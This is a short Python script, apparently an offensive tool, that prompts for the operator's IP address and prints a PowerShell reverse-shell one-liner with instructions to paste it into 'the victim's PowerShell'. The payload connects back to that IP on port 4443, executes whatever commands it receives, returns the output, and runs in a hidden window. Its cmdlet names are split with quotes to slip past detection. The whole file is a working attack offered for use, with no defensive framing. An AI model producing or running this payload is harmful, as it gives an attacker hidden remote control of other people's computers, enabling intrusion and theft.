import time
import sys
import os

def generar_codigo(ip):
    os.system("clear")
    print("[+] Generating code...")
    time.sleep(5) 
    print('')
    print("\nCopy the text and paste it into the victim's PowerShell !")
    print('')
    print("S''t''a''r''t-P''r''o''c''e''s''s $PSHOME\powershell.exe -ArgumentList {$client = N''e''w-O''b''j''e''c''t System.Net.Sockets.TCPClient('" + ip + "',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''ex $data 2>&1 | O''u''t-''St''r''i''n''g );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden")
    print("")

os.system("clear")
logo = r"""
   _____ _                      ____            _       
  / ____(_)                    |  _ \          | |      
 | (___  _ _ __ ___   ___  ___ | |_) |_ __ ___| |_ ___ 
  \___ \| | '_ ` _ \ / _ \/ __||  _ <| '__/ _ \ __/ __|
  ____) | | | | | | |  __/\__ \| |_) | | |  __/ |_\__ \
 |_____/|_|_| |_| |_|\___||___/|____/|_|  \___|\__|___/
                                                        
"""

print(logo)
ip = input("[?] Put your IP > ")
print("")
generar_codigo(ip)
print("")
sys.exit()
